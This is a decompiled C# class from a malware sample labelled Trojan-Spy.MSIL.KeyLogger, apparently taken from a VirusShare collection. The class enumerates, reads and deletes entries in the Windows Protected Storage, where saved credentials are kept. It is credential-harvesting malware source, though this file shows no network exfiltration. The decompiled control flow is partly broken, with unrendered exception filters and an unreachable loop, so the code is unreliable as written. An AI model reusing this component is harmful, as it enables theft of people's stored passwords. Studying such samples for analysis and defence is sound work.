// Decompiled with JetBrains decompiler
// Type: Roy.CItems
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Roy.PStoreLib;
using System;
using System.Collections;
using System.Runtime.InteropServices;

namespace Roy
{
  internal class CItems : CUtils, IEnumerable, IEnumerator
  {
    private IPStore m_IPStore;
    private PST_KEY m_KeyType;
    private Guid m_TypeGuid;
    private Guid m_SubTypeGuid;
    private IEnumPStoreItems m_IEnumItem;
    private CItem m_Current;

    internal CItems(IPStore PStore, PST_KEY KeyType, ref Guid guidType, ref Guid guidSubType)
    {
      this.m_TypeGuid = new Guid();
      this.m_SubTypeGuid = new Guid();
      this.m_IPStore = PStore;
      this.m_KeyType = KeyType;
      this.m_TypeGuid = guidType;
      this.m_SubTypeGuid = guidSubType;
      this.m_IEnumItem = PStore.EnumItems(KeyType, ref guidType, ref guidSubType, 0);
    }

    public CItem get_Item(int Index)
    {
      int num1;
      CItem citem1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        this.m_IEnumItem.Reset();
        this.m_IEnumItem.Skip(Index);
        int rgelt;
        int pceltFetched;
        this.m_IEnumItem.Next(1, ref rgelt, ref pceltFetched);
        citem1 = (CItem) null;
        if (rgelt != 0)
        {
          citem1 = new CItem();
          CItem citem2 = citem1;
          IPStore ipStore = this.m_IPStore;
          int keyType = (int) this.m_KeyType;
          ref Guid local1 = ref this.m_TypeGuid;
          ref Guid local2 = ref this.m_SubTypeGuid;
          IntPtr ptr = new IntPtr(rgelt);
          string szItemName = this.CopyString(ptr);
          citem2.Init(ipStore, (PST_KEY) keyType, ref local1, ref local2, szItemName);
          ptr = new IntPtr(rgelt);
          Marshal.FreeCoTaskMem(ptr);
          goto label_7;
        }
        else
          goto label_7;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            goto label_7;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num1 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      CItem citem3 = citem1;
      if (num2 == 0)
        return citem3;
      ProjectData.ClearProjectError();
      return citem3;
    }

    public int Count
    {
      get
      {
        int num1;
        int num2;
        int num3;
        try
        {
          ProjectData.ClearProjectError();
          num1 = 2;
          this.m_IEnumItem.Reset();
          while (true)
          {
            this.m_IEnumItem.Skip(1);
            checked { ++num2; }
          }
label_2:
          num3 = -1;
          switch (num1)
          {
            case 2:
              goto label_7;
          }
        }
        catch (Exception ex) when (
        {
          int num4;
          if (ex is Exception & num1 != 0 & num4 == 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          ProjectData.SetProjectError(ex);
          goto label_2;
        }
        throw ProjectData.CreateProjectError(-2146828237);
label_7:
        int count = num2;
        if (num3 == 0)
          return count;
        ProjectData.ClearProjectError();
        return count;
      }
    }

    public void Delete(string szItemName) => this.m_IPStore.DeleteItem(this.m_KeyType, ref this.m_TypeGuid, ref this.m_SubTypeGuid, szItemName, 0, 0);

    public void Add(Guid guidType, Guid guidSubType, string szItemName)
    {
    }

    public byte[] ReadItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
    {
      int num1;
      byte[] numArray1;
      int num2;
      try
      {
        byte[] destination = (byte[]) null;
        ProjectData.ClearProjectError();
        num1 = 2;
        int pcbData;
        IntPtr ppbData;
        this.m_IPStore.ReadItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, ref pcbData, ref ppbData, 0, 0);
        if (ppbData != IntPtr.Zero)
        {
          destination = new byte[checked (pcbData - 1 + 1)];
          Marshal.Copy(ppbData, destination, 0, pcbData);
          Marshal.FreeCoTaskMem(ppbData);
        }
        numArray1 = destination;
        goto label_9;
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            int num3 = (int) Interaction.MsgBox((object) Information.Err().Description);
            goto label_9;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      byte[] numArray2 = numArray1;
      if (num2 == 0)
        return numArray2;
      ProjectData.ClearProjectError();
      return numArray2;
    }

    public IEnumerator GetEnumerator()
    {
      this.Reset();
      return (IEnumerator) this;
    }

    public void Reset() => this.m_IEnumItem.Reset();

    public object Current => (object) this.m_Current;

    public bool MoveNext()
    {
      int rgelt;
      int pceltFetched;
      if (this.m_IEnumItem.Next(1, ref rgelt, ref pceltFetched) != 0)
        return false;
      if (rgelt != 0)
      {
        this.m_Current = new CItem();
        CItem current = this.m_Current;
        IPStore ipStore = this.m_IPStore;
        int keyType = (int) this.m_KeyType;
        ref Guid local1 = ref this.m_TypeGuid;
        ref Guid local2 = ref this.m_SubTypeGuid;
        IntPtr ptr = new IntPtr(rgelt);
        string szItemName = this.CopyString(ptr);
        current.Init(ipStore, (PST_KEY) keyType, ref local1, ref local2, szItemName);
        ptr = new IntPtr(rgelt);
        Marshal.FreeCoTaskMem(ptr);
      }
      return true;
    }
  }
}
